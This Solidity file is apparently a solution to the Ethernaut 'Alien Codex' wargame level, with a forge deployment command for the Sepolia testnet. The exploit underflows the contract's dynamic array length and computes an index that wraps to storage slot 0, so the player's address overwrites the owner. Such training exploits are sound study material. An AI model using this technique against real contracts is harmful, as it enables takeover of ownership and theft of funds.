// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

import "./AlienCodex.sol";

// forge create --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY --broadcast src/contracts/alien_codex/Hax.sol:Hax --constructor-args "0x33aEdCCff3d4b1edDd1199CAC7d8FA8776BED951" "1" "1"
contract Hax {
    constructor(AlienCodex _alienCodex, uint _slot, uint _idx) public {
        uint index = ((2 ** 256) - 1) -
            uint(keccak256(abi.encode(_slot))) +
            _idx;

        bytes32 player = bytes32(uint256(uint160(tx.origin)));

        _alienCodex.makeContact();
        _alienCodex.retract();
        _alienCodex.revise(index, player);
    }
}
